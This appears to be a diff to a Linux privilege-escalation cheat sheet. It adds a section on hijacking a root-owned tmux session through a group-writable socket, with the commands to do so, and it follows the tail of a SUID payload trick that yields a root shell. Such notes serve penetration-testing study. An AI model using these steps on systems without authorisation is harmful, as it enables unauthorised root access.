@@ -572,3 +572,18 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
+
+### Hijacking Tmux Sessions
+if a session was created like this 
+```
+$ tmux -S /shareds new -s debugsess
+$ chown root:devs /shareds
+```
+if we are in the dev group, we can attach to this session and gain root access.
+```shell
+$ ps aux | grep tmux
+
+$ id
+
+$ tmux -S /shareds
+```
